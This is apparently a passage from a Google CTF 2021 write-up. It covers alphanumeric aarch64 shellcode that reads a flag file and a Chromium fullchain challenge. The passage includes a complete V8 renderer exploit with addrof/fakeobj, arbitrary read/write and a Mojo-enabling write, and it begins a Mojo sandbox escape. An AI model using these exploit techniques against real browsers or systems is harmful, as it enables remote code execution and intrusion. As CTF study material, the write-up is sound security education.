<span class="hljs-built_in">print</span>(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))
</code></pre><p>Then we get:</p>
<pre class="hljs"><code>    /* push b&#x27;flag\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>&#x27; */
    <span class="hljs-keyword">sub</span> sp<span class="hljs-punctuation">,</span> sp<span class="hljs-punctuation">,</span> <span class="hljs-variable">#16</span>
    /* Set <span class="hljs-keyword">x</span><span class="hljs-number">0</span> <span class="hljs-operator">=</span> <span class="hljs-number">1734437990</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x67616c66</span> */
    mov  <span class="hljs-keyword">x</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">#27750</span>
    movk <span class="hljs-keyword">x</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">#26465</span><span class="hljs-punctuation">,</span> lsl <span class="hljs-variable">#16</span>
    stur <span class="hljs-keyword">x</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> [sp<span class="hljs-punctuation">,</span> <span class="hljs-variable">#16</span> * <span class="hljs-number">0</span>]
    /* <span class="hljs-keyword">call</span> open(&#x27;sp&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> &#x27;O_RDONLY&#x27;) */
    mov  <span class="hljs-keyword">x</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> sp
    mov  <span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span> xzr
    mov  <span class="hljs-keyword">x</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span> xzr
    mov  <span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-punctuation">,</span> #(SYS_open)
    svc <span class="hljs-number">0</span>
    /* <span class="hljs-keyword">call</span> sendfile(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-keyword">x</span><span class="hljs-number">0</span>&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">2147483647</span>) */
    mov  <span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">x</span><span class="hljs-number">0</span>
    mov  <span class="hljs-keyword">x</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">#1</span>
    mov  <span class="hljs-keyword">x</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span> xzr
    /* Set <span class="hljs-keyword">x</span><span class="hljs-number">3</span> <span class="hljs-operator">=</span> <span class="hljs-number">2147483647</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x7fffffff</span> */
    mov  <span class="hljs-keyword">x</span><span class="hljs-number">3</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">#65535</span>
    movk <span class="hljs-keyword">x</span><span class="hljs-number">3</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">#32767</span><span class="hljs-punctuation">,</span> lsl <span class="hljs-variable">#16</span>
    mov  <span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-punctuation">,</span> #(SYS_sendfile)
    svc <span class="hljs-number">0</span>
</code></pre><p>Now we need to transform the above assembly into a shellcode that uses alphanumeric bytes.</p>
<h5 id="system-call"><a class="header-link" href="#system-call"></a>System call</h5>
<p>The instruction <code>svc</code> in aarch64 stands for &quot;supervisor call&quot;. It works like <code>syscall</code> in x86-64. However, if we look up section C3.2.3 of <a href="https://github.com/CAS-Atlantic/AArch64-Encoding/blob/master/binary%20encodding.pdf">aarch64 machine code table</a>, we know that the two most significant bytes is definitely not alphanumeric. Therefore, we must come up with a workaround. Note that our goal for now is to generate a <code>svc #257</code> instruction, whose machine code is <code>b&#39;! \x00\xd4&#39;</code>. We only have two invalid bytes (<code>b&#39;\x00\xd4</code>).</p>
<p>The workaround is that we send <code>b&#39;! AA&#39;</code> as placeholder and dynamically change <code>b&#39;AA&#39;</code> into <code>b&#39;\x00\xd4</code>. To achieve this, we observe that the registers <code>x0</code> and <code>x1</code> always point to our shellcode. Therefore, we can use <code>strb w??, [x1, x??]</code> or <code>strh w??, [x1, x??]</code> to dynamically modify our shellcode.</p>
<p>Note that due to the mechanism of instruction cache and data cache, we have to put a branch instruction (not taken) after we finish modifying the shellcode. Otherwise, the instruction cache will not be flushed and the CPU still sees the old placeholders. The branch instruction we use is <code>cbnz w26, 0x40404</code>.</p>
<h5 id="loading-an-arbitrary-integer-into-a-register"><a class="header-link" href="#loading-an-arbitrary-integer-into-a-register"></a>Loading an arbitrary integer into a register</h5>
<p>Let&#39;s say the <code>svc #257</code> instruction is at the 64th~67th byte of our shellcode, and we want to use <code>strh w9, [x1, x25]</code> to replace the 67th byte. That is, <code>w9</code> should be <code>0xd4</code> and <code>w25</code> should be <code>0x43</code>. To achieve this, we find <a href="https://arxiv.org/pdf/1608.03415.pdf">this paper</a>, whose section 4.1.2 gives us a great hint. We come up with the following shellcode:</p>
<pre class="hljs"><code><span class="hljs-comment">/* w26 is always 0 by our observation */</span>
<span class="hljs-keyword">adds</span> w17, w26, <span class="hljs-number">#2460</span>
<span class="hljs-keyword">subs</span> w9, w17, <span class="hljs-number">#2248</span> <span class="hljs-comment">/* w9 = 0xd4 */</span>
<span class="hljs-keyword">adds</span> w17, w26, <span class="hljs-number">#2131</span>
<span class="hljs-keyword">subs</span> w25, w11, <span class="hljs-number">#2064</span> <span class="hljs-comment">/* w25 = 0x43 */</span>
<span class="hljs-keyword">strb</span> w9, [x1, x25]

<span class="hljs-keyword">cbnz</span> w26, <span class="hljs-number">0x40404</span> <span class="hljs-comment">/* branch instruction for i-cache flushing */</span>
<span class="hljs-keyword">cbnz</span> w26, <span class="hljs-number">0x40404</span> <span class="hljs-comment">/* act as nop */</span>
<span class="hljs-keyword">cbnz</span> w26, <span class="hljs-number">0x40404</span> <span class="hljs-comment">/* act as nop */</span>
<span class="hljs-keyword">cbnz</span> w26, <span class="hljs-number">0x40404</span> <span class="hljs-comment">/* act as nop */</span>
<span class="hljs-keyword">cbnz</span> w26, <span class="hljs-number">0x40404</span> <span class="hljs-comment">/* act as nop */</span>
<span class="hljs-keyword">cbnz</span> w26, <span class="hljs-number">0x40404</span> <span class="hljs-comment">/* act as nop */</span>
<span class="hljs-keyword">cbnz</span> w26, <span class="hljs-number">0x40404</span> <span class="hljs-comment">/* act as nop */</span>
<span class="hljs-keyword">cbnz</span> w26, <span class="hljs-number">0x40404</span> <span class="hljs-comment">/* act as nop */</span>
<span class="hljs-keyword">cbnz</span> w26, <span class="hljs-number">0x40404</span> <span class="hljs-comment">/* act as nop */</span>
<span class="hljs-keyword">cbnz</span> w26, <span class="hljs-number">0x40404</span> <span class="hljs-comment">/* act as nop */</span>
<span class="hljs-keyword">cbnz</span> w26, <span class="hljs-number">0x40404</span> <span class="hljs-comment">/* act as nop */</span>

<span class="hljs-comment">/* svc #257 */</span> <span class="hljs-comment">/* below is the 64th~67th byte */</span>
<span class="hljs-symbol">.inst</span> <span class="hljs-number">0x41413021</span>  <span class="hljs-comment">/* the two 0x41 is the placeholder */</span>
</code></pre><p>As a check, the assembled machine code is <code>b&#39;Qs&amp;1)&quot;#qQO!1yA q)h98:  5:  5:  5:  5:  5:  5:  5:  5:  5:  5:  5!0AA&#39;</code>, which is alphanumeric. The above shellcode can change the 67th byte from <code>b&#39;A&#39;</code> to <code>b&#39;\xd4&#39;</code>. Read the field specification of <code>adds</code> and <code>subs</code> machine code. It should be straightforward to construct a alphanumeric <code>adds</code> and <code>subs</code> pair that loads arbitrary byte into a register.</p>
<p>To sum up, we have a powerful technique that can dynamically modify our shellcode. This means we can execute almost any shellcode we want!</p>
<h4 id="optimization"><a class="header-link" href="#optimization"></a>Optimization</h4>
<p>Everything looks so nice ... except that we have a 280 byte limit. Though it seems we can execute arbitrary shellcode, dynamically modify a single byte costs 5 instructions in the previous demonstration. That&#39;s why we still need a lot of manual optimization to make our shellcode more compact.</p>
<h5 id="optimization-openat-100-flag-0-0"><a class="header-link" href="#optimization-openat-100-flag-0-0"></a>Optimization: <code>openat(-100, &quot;flag&quot;, 0, 0)</code></h5>
<p>To open the file &quot;flag&quot;, we have to set <code>x0</code> to -100, and <code>x1</code> points at the string &quot;flag&quot;.</p>
<p>The <code>x1</code> part seems to be easier. We just uses <code>adds x1, x1, 0x??</code> to make <code>x1</code> points at the &quot;flag&quot; string in x86-64 shellcode. However, bad news is that <code>x1</code> is a pointer on 64-bit architecture, and both 64-bit <code>adds</code> or <code>subs</code> are not alphanumeric. We have no choice but use dynamic modification of our shellcode.</p>
<p>The <code>x0</code> part has the same problem. We cannot use any 32-bit instruction to make <code>x0</code> a -100 in 64-bit. Therefore, we still need dynamic modification of our shellcode.</p>
<h5 id="optimization-use-strh"><a class="header-link" href="#optimization-use-strh"></a>Optimization: use <code>strh</code></h5>
<p>In previous demonstration, we use <code>strb</code> to modify our shellcode, which change a single bit at a time. In some special situation, we can use <code>strh</code> to modify 2 bytes at a time. It can make our modification much more efficient.</p>
<p>The reason is that <code>adds</code> and <code>subs</code> has a 12-bit immediate, and the immediate&#39;s position in the instruction is special. If the immediate is between <code>[0x0, 0x7ff]</code>, then we may have a chance to use <code>strh</code>. Please refer to the final payload for demonstration.</p>
<h5 id="optimization-reuse-adds"><a class="header-link" href="#optimization-reuse-adds"></a>Optimization: reuse <code>adds</code></h5>
<p>This is probably the most important optimization in our solution. We analyze every byte which we need to load into registers, and we find out that we can use only few <code>adds</code> to cover all the byte we need to modify. For example, we need <code>0xb1</code>, <code>0xba</code>, <code>0xbb</code>, and <code>0xf1</code>. We can reuse <code>adds </code> as follows:</p>
<pre class="hljs"><code><span class="hljs-attribute">adds</span> w<span class="hljs-number">18</span>, w<span class="hljs-number">26</span>, #<span class="hljs-number">2508</span>
<span class="hljs-attribute">subs</span> w<span class="hljs-number">10</span>, w<span class="hljs-number">18</span>, #<span class="hljs-number">2331</span> /* w<span class="hljs-number">10</span> = <span class="hljs-number">0</span>xb<span class="hljs-number">1</span> */
<span class="hljs-attribute">subs</span> w<span class="hljs-number">11</span>, w<span class="hljs-number">18</span>, #<span class="hljs-number">2322</span> /* w<span class="hljs-number">11</span> = <span class="hljs-number">0</span>xba */
<span class="hljs-attribute">subs</span> w<span class="hljs-number">12</span>, w<span class="hljs-number">18</span>, #<span class="hljs-number">2321</span> /* w<span class="hljs-number">12</span> = <span class="hljs-number">0</span>xbb */
<span class="hljs-attribute">subs</span> w<span class="hljs-number">13</span>, w<span class="hljs-number">18</span>, #<span class="hljs-number">2267</span> /* w<span class="hljs-number">13</span> = <span class="hljs-number">0</span>xf<span class="hljs-number">1</span> */
</code></pre><p>In this way, we significantly reduce the number of instructions in our payload.</p>
<h4 id="the-final-payload"><a class="header-link" href="#the-final-payload"></a>The final payload</h4>
<p><a href="https://gist.github.com/ktpss95112/319735f78335cf4088239a1b9883811f">https://gist.github.com/ktpss95112/319735f78335cf4088239a1b9883811f</a></p>
<p>flag: <code>CTF{abc_easy_as_svc}</code></p>
<h4 id="postscript"><a class="header-link" href="#postscript"></a>Postscript</h4>
<p>After the contest, we read the official writeup. Their approach is to call <code>execve(&quot;/bin/cat&quot;, {&quot;/bin/cat&quot;, &quot;flag&quot;, 0})</code>, which requires only one system call. This inspire us that we can construct a more compact payload - use no system call! We observe that <code>x17</code> contains the libc address of <code>read()</code> when our shellcode is executed. That is, we can use <code>x17</code> to obtain the address of <code>system()</code>, and then simply <code>system(&quot;/bin/cat flag&quot;)</code>. No system call, and only one parameter to prepare.</p>
<h4 id="references"><a class="header-link" href="#references"></a>References</h4>
<ul class="list">
<li>x86-64 <code>jge</code> machine code: <a href="https://www.felixcloutier.com/x86/jcc">https://www.felixcloutier.com/x86/jcc</a></li>
<li>Use <code>gdb</code> to debug aarch64 binary on x86-64: <a href="https://dev.to/offlinemark/how-to-set-up-an-arm64-playground-on-ubuntu-18-04-27i6">https://dev.to/offlinemark/how-to-set-up-an-arm64-playground-on-ubuntu-18-04-27i6</a></li>
<li>Cross architecture shellcode: <a href="https://github.com/ixty/xarch_shellcode">https://github.com/ixty/xarch_shellcode</a></li>
<li>A useful slides introducing common aarch64 instruction&#39;s machine code: <a href="https://www.cs.princeton.edu/courses/archive/spr19/cos217/lectures/16_MachineLang.pdf">https://www.cs.princeton.edu/courses/archive/spr19/cos217/lectures/16_MachineLang.pdf</a></li>
<li>A general guide of generating alphanumeric shellcode in aarch64: <a href="https://arxiv.org/pdf/1608.03415.pdf">https://arxiv.org/pdf/1608.03415.pdf</a></li>
<li>aarch64 machine code table: <a href="https://github.com/CAS-Atlantic/AArch64-Encoding/blob/master/binary%20encodding.pdf">https://github.com/CAS-Atlantic/AArch64-Encoding/blob/master/binary%20encodding.pdf</a></li>
</ul>
<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
<h3 id="ebpf"><a class="header-link" href="#ebpf"></a>EBPF</h3>
<p><a href="https://github.com/st424204/ctf_practice/tree/master/GoogleCTF2021/EBPF">https://github.com/st424204/ctf_practice/tree/master/GoogleCTF2021/EBPF</a></p>
<p>flag: <code>CTF{wh0_v3r1f1e5_7h3_v3r1f1er_c9716a89aa5d92a}</code></p>
<h3 id="fullchain"><a class="header-link" href="#fullchain"></a>Fullchain</h3>
<p>The challenge gave us a vulnerable Chromium browser ( which contains vulnerabilities in two different parts: the V8 engine and the Mojo interface ) and a vulnerable linux kernel module. We were asked to pwn the entire thing: the V8 engine, the Chrome sandbox and the kernel module -- all with a single fullchain exploit.</p>
<h4 id="renderer-rce--v8-"><a class="header-link" href="#renderer-rce--v8-"></a>Renderer RCE ( V8 )</h4>
<p>The challenge introduces a patch into V8 Javascript engine. It comments out three lines in function <code>TypedArrayPrototypeSetTypedArray</code>: </p>
<pre class="hljs"><code><span class="hljs-comment">diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq</span>
<span class="hljs-comment">index b5c9dcb261..ac5ebe9913 100644</span>
<span class="hljs-comment">--- a/src/builtins/typed-array-set.tq</span>
<span class="hljs-comment">+++ b/src/builtins/typed-array-set.tq</span>
<span class="hljs-meta">@@ -198,7 +198,7 @@</span> TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
   if (targetOffsetOverflowed) goto IfOffsetOutOfBounds;
 
   // 9. Let targetLength be target.[[ArrayLength]].
<span class="hljs-deletion">-  const targetLength = target.length;</span>
<span class="hljs-addition">+  // const targetLength = target.length;</span>
 
   // 19. Let srcLength be typedArray.[[ArrayLength]].
   const srcLength: uintptr = typedArray.length;
<span class="hljs-meta">@@ -207,8 +207,8 @@</span> TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
 
   // 21. If srcLength + targetOffset &gt; targetLength, throw a RangeError
   //   exception.
<span class="hljs-deletion">-  CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)</span>
<span class="hljs-deletion">-      otherwise IfOffsetOutOfBounds;</span>
<span class="hljs-addition">+  // CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)</span>
<span class="hljs-addition">+  //     otherwise IfOffsetOutOfBounds;</span>
 
   // 12. Let targetName be the String value of target.[[TypedArrayName]].
   // 13. Let targetType be the Element Type value in Table 62 for
</code></pre><p>This function will be called if we want to set a TypedArray within a TypedArray in Javascript. From the patch, it comments out a overflow check when <code>srcLength</code> plus <code>targetOffset</code> is larger than <code>targetLength</code> ( see the following Javascript for example ). If the patch was not introduced, it will throw an exception when we want to set a TypedArray larger than the src TypedArray. But because of this patch, we can bypass the overflow check and set the array with index 9 as the starting position. It&#39;s actually a very powerful out-of-bound write, and we use this vulnerability to overwrite <code>uint32</code>&#39;s length to make us use this <code>uint32</code> to achieve out-of-bound read/write.</p>
<pre class="hljs"><code><span class="hljs-keyword">const</span> uint32 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>([<span class="hljs-number">0x1000</span>]);
oob_access_array = [uint32];
<span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>([<span class="hljs-number">1.1</span>]);
uint32.set(uint32, <span class="hljs-number">9</span>);
<span class="hljs-built_in">console</span>.log(uint32.length); <span class="hljs-comment">// 0x1000</span>
</code></pre><p>Because we allocate a Javascript <code>Array</code> after <code>TypedArray</code>, we can also modify its element as <code>Integer</code> from <code>uint32</code>. We use it to create a primitive function <code>addrof</code> by placing the object in <code>oob_access_array</code> and get its address from <code>uint32</code> at index 0x15. Another primitive function <code>fakeobj</code> is done by placing the arbitrary address at index 0x15 of <code>uint32</code> and get fake object from <code>oob_access_array</code>.</p>
<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrof</span>(<span class="hljs-params">in_obj</span>) </span>{
    oob_access_array[<span class="hljs-number">0</span>] = in_obj;
    <span class="hljs-keyword">return</span> uint32[<span class="hljs-number">0x15</span>];
}
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeobj</span>(<span class="hljs-params">addr</span>) </span>{
    uint32[<span class="hljs-number">0x15</span>] = addr;
    <span class="hljs-keyword">return</span> oob_access_array[<span class="hljs-number">0</span>];
}

</code></pre><p>We also leak <code>float_array_map</code> from <code>uint32</code> at index 62 and V8 heap base address from <code>uint32</code> at index 12. With <code>float_array_map</code> we can create a fake float array for arbitrary address read/write. With V8 heap base, we can read some useful content using arbitrary read/write on V8 heap.</p>
<pre class="hljs"><code><span class="hljs-keyword">var</span> float_array_map = uint32[<span class="hljs-number">62</span>];
<span class="hljs-keyword">if</span> (float_array_map == <span class="hljs-number">0x3ff19999</span>)
    float_array_map = uint32[<span class="hljs-number">63</span>];

<span class="hljs-keyword">var</span> arr2 = [itof(<span class="hljs-built_in">BigInt</span>(float_array_map)), itof(<span class="hljs-number">0n</span>), itof(<span class="hljs-number">8n</span>), itof(<span class="hljs-number">1n</span>), itof(<span class="hljs-number">0x1234n</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>].slice();
<span class="hljs-keyword">var</span> fake = fakeobj(addrof(arr2) - <span class="hljs-number">0x38</span>);
<span class="hljs-keyword">var</span> v8_heap = <span class="hljs-built_in">BigInt</span>(uint32[<span class="hljs-number">12</span>]) &lt;&lt; <span class="hljs-number">32n</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">arbread</span>(<span class="hljs-params">addr</span>) </span>{
    arr2[<span class="hljs-number">5</span>] = itof(addr);
    <span class="hljs-keyword">return</span> ftoi(fake[<span class="hljs-number">0</span>]);
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">arbwrite</span>(<span class="hljs-params">addr, val</span>) </span>{
    arr2[<span class="hljs-number">5</span>] = itof(addr);
    fake[<span class="hljs-number">0</span>] = itof(val);
}
</code></pre><p>Now it is time to do some useful thing from those primitive functions. In renderer exploit, our goal is to modify a flag value so we can use Mojo in Javascript. Studying from the previous public write-ups about chrome exploit, the easiest way is to modify the the global variable <code>blink::RuntimeEnabledFeaturesBase::is_mojo_js_enabled_</code>. First we need to leak chrome base address. We use <code>window</code> object to leak it.</p>
<pre class="hljs"><code><span class="hljs-keyword">var</span> leak = <span class="hljs-built_in">BigInt</span>(addrof(<span class="hljs-built_in">window</span>)) + <span class="hljs-number">0x10n</span> + v8_heap - <span class="hljs-number">1n</span>;
<span class="hljs-keyword">var</span> chrome_base = arbread(leak) - <span class="hljs-number">0xc1ce730n</span>;
</code></pre><p>But where is <code>is_mojo_js_enabled</code> ? Fortunately  the challenge chromium binary has symbol, we can use the following command to find out the offset of global variable <code>is_mojo_js_enabled_</code>.</p>
<pre class="hljs"><code>$ nm --demangle ./chrome | grep -i <span class="hljs-string">&#x27;is_mojo_js_enabled&#x27;</span>
000000000c560f0e b blink::RuntimeEnabledFeaturesBase::is_mojo_js_enabled_
</code></pre><p>Turn on the flag and reload the page to make Mojo allowed in Javascript. We can store the <code>chrome_base</code> in localStorage, which can be used for exploiting the sandbox later. </p>
<pre class="hljs"><code><span class="hljs-keyword">var</span> mojo_enabled = chrome_base + <span class="hljs-number">0xc560f0en</span>;
<span class="hljs-built_in">localStorage</span>.setItem(<span class="hljs-string">&quot;chrome_base&quot;</span>, chrome_base);
arbwrite(mojo_enabled, <span class="hljs-number">1n</span>);
<span class="hljs-built_in">window</span>.location.reload();
</code></pre><p>The whole renderer exploit:</p>
<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn_v8</span>(<span class="hljs-params"></span>) </span>{
    print(<span class="hljs-string">&quot;In v8&quot;</span>);
    <span class="hljs-keyword">const</span> uint32 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>([<span class="hljs-number">0x1000</span>]);
    oob_access_array = [uint32];
    <span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>([<span class="hljs-number">1.1</span>]);
    uint32.set(uint32, <span class="hljs-number">9</span>);

    <span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">8</span>);
    <span class="hljs-keyword">var</span> f64_buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(buf);
    <span class="hljs-keyword">var</span> u64_buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(buf);

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ftoi</span>(<span class="hljs-params">val</span>) </span>{
        f64_buf[<span class="hljs-number">0</span>] = val;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">BigInt</span>(u64_buf[<span class="hljs-number">0</span>]) + (<span class="hljs-built_in">BigInt</span>(u64_buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">32n</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">itof</span>(<span class="hljs-params">val</span>) </span>{
        u64_buf[<span class="hljs-number">0</span>] = <span class="hljs-built_in">Number</span>(val &amp; <span class="hljs-number">0xffffffffn</span>);
        u64_buf[<span class="hljs-number">1</span>] = <span class="hljs-built_in">Number</span>(val &gt;&gt; <span class="hljs-number">32n</span>);
        <span class="hljs-keyword">return</span> f64_buf[<span class="hljs-number">0</span>];
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrof</span>(<span class="hljs-params">in_obj</span>) </span>{
        oob_access_array[<span class="hljs-number">0</span>] = in_obj;
        <span class="hljs-keyword">return</span> uint32[<span class="hljs-number">0x15</span>];
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeobj</span>(<span class="hljs-params">addr</span>) </span>{
        uint32[<span class="hljs-number">0x15</span>] = addr;
        <span class="hljs-keyword">return</span> oob_access_array[<span class="hljs-number">0</span>];
    }

    <span class="hljs-keyword">var</span> float_array_map = uint32[<span class="hljs-number">62</span>];
    <span class="hljs-keyword">if</span> (float_array_map == <span class="hljs-number">0x3ff19999</span>)
        float_array_map = uint32[<span class="hljs-number">63</span>];

    <span class="hljs-keyword">var</span> arr2 = [itof(<span class="hljs-built_in">BigInt</span>(float_array_map)), itof(<span class="hljs-number">0n</span>), itof(<span class="hljs-number">8n</span>), itof(<span class="hljs-number">1n</span>), itof(<span class="hljs-number">0x1234n</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>].slice();
    <span class="hljs-keyword">var</span> fake = fakeobj(addrof(arr2) - <span class="hljs-number">0x38</span>);
    <span class="hljs-keyword">var</span> v8_heap = <span class="hljs-built_in">BigInt</span>(uint32[<span class="hljs-number">12</span>]) &lt;&lt; <span class="hljs-number">32n</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">arbread</span>(<span class="hljs-params">addr</span>) </span>{
        arr2[<span class="hljs-number">5</span>] = itof(addr);
        <span class="hljs-keyword">return</span> ftoi(fake[<span class="hljs-number">0</span>]);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">arbwrite</span>(<span class="hljs-params">addr, val</span>) </span>{
        arr2[<span class="hljs-number">5</span>] = itof(addr);
        fake[<span class="hljs-number">0</span>] = itof(val);
    }
    <span class="hljs-keyword">var</span> leak = <span class="hljs-built_in">BigInt</span>(addrof(<span class="hljs-built_in">window</span>)) + <span class="hljs-number">0x10n</span> + v8_heap - <span class="hljs-number">1n</span>;
    <span class="hljs-keyword">var</span> chrome_base = arbread(leak) - <span class="hljs-number">0xc1ce730n</span>;
    <span class="hljs-keyword">var</span> mojo_enabled = chrome_base + <span class="hljs-number">0xc560f0en</span>;
    <span class="hljs-built_in">localStorage</span>.setItem(<span class="hljs-string">&quot;chrome_base&quot;</span>, chrome_base);
    arbwrite(mojo_enabled, <span class="hljs-number">1n</span>);
    <span class="hljs-built_in">window</span>.location.reload();
}
</code></pre><h4 id="sandbox-escaping"><a class="header-link" href="#sandbox-escaping"></a>Sandbox Escaping</h4>
<p>For sandbox escaping, the challenge added a vulnerable Mojo interface <code>CtfInterface</code> to the Chromium browser. Here we only show the most important part of the challenge patch file:</p>
<pre class="hljs"><code><span class="hljs-addition">+void CtfInterfaceImpl::Create(</span>
<span class="hljs-addition">+    mojo::PendingReceiver&lt;blink::mojom::CtfInterface&gt; receiver) {</span>
<span class="hljs-addition">+  auto self = std::make_unique&lt;CtfInterfaceImpl&gt;();</span>
<span class="hljs-addition">+  mojo::MakeSelfOwnedReceiver(std::move(self), std::move(receiver));</span>
<span class="hljs-addition">+}</span>
<span class="hljs-addition">+</span>
<span class="hljs-addition">+void CtfInterfaceImpl::ResizeVector(uint32_t size,</span>
<span class="hljs-addition">+                                    ResizeVectorCallback callback) {</span>
<span class="hljs-addition">+  numbers_.resize(size);</span>
<span class="hljs-addition">+  std::move(callback).Run();</span>
<span class="hljs-addition">+}</span>
<span class="hljs-addition">+</span>
<span class="hljs-addition">+void CtfInterfaceImpl::Read(uint32_t offset, ReadCallback callback) {</span>
<span class="hljs-addition">+  std::move(callback).Run(numbers_[offset]);</span>
<span class="hljs-addition">+}</span>
<span class="hljs-addition">+</span>
<span class="hljs-addition">+void CtfInterfaceImpl::Write(double value,</span>
<span class="hljs-addition">+                             uint32_t offset,</span>
<span class="hljs-addition">+                             WriteCallback callback) {</span>
<span class="hljs-addition">+  numbers_[offset] = value;</span>
<span class="hljs-addition">+  std::move(callback).Run();</span>
<span class="hljs-addition">+}</span>
<span class="hljs-addition">+</span>

//.......omitted...........
// The CtfInterfaceImpl class
<span class="hljs-addition">+class CONTENT_EXPORT CtfInterfaceImpl : public blink::mojom::CtfInterface {</span>
<span class="hljs-addition">+ public:</span>
<span class="hljs-addition">+  CtfInterfaceImpl();</span>
<span class="hljs-addition">+  ~CtfInterfaceImpl() override;</span>
<span class="hljs-addition">+  static void Create(</span>
<span class="hljs-addition">+      mojo::PendingReceiver&lt;blink::mojom::CtfInterface&gt; receiver);</span>
<span class="hljs-addition">+</span>
<span class="hljs-addition">+  void ResizeVector(uint32_t size, ResizeVectorCallback callback) override;</span>
<span class="hljs-addition">+  void Write(double value, uint32_t offset, WriteCallback callback) override;</span>
<span class="hljs-addition">+  void Read(uint32_t offset, ReadCallback callback) override;</span>
<span class="hljs-addition">+</span>
<span class="hljs-addition">+ private:</span>
<span class="hljs-addition">+  std::vector&lt;double&gt; numbers_;</span>
<span class="hljs-addition">+  DISALLOW_COPY_AND_ASSIGN(CtfInterfaceImpl);</span>
<span class="hljs-addition">+};</span>

//.......omitted...........

<span class="hljs-addition">+interface CtfInterface {</span>
<span class="hljs-addition">+  ResizeVector(uint32 size) =&gt; ();</span>
<span class="hljs-addition">+  Read(uint32 offset) =&gt; (double value);</span>
<span class="hljs-addition">+  Write(double value, uint32 offset) =&gt; ();</span>
<span class="hljs-addition">+};</span>
</code></pre><p>As we can see in the patch file, the interface implements three functions to allow us interact with the browser process :</p>
<ul class="list">
<li><code>resizeVector</code> : This function allow us to allocate a double vector ( <code>std::vector&lt;double&gt; numbers_</code> ) in <code>CtfInterface</code>.</li>
<li><code>read</code> : This function allow us to read a double value from <code>numbers_</code>.</li>
<li><code>write</code> : This function will write a double value to <code>numbers_</code>.</li>
</ul>
<p>The vulnerability is pretty obvious : the <code>read</code> and <code>write</code> function allow us to read/write a double value from/to a arbitrary offset of the <code>numbers_</code> vector, creating a OOB read/write situation.</p>
<p>Here our exploit plan is simple : use the OOB read to leak some address, and use the OOB write to corrupt the vtable of the <code>CtfInterfaceImpl</code> object and hijack the control flow.</p>
<p>First we&#39;ll have to arrange our heap layout. Our goal is to try place a <code>CtfInterfaceImpl</code> object right behind the <code>numbers_</code> vector, so later we can use OOB read/write on this <code>numbers_</code> to corrupt the <code>CtfInterfaceImpl</code> object.</p>
<p>After some trial and error, and lots of debugging with gdb, we were finally able to achieve this by using the following method:</p>
<ul class="list">
<li>Create lots of <code>CtfInterfaceImpl</code> objects first. These objects will have high probability to be placed on a continuous heap memory.</li>
<li>Free those <code>CtfInterfaceImpl</code> objects, this will create lots of free chunks ( size: 0x20 )</li>
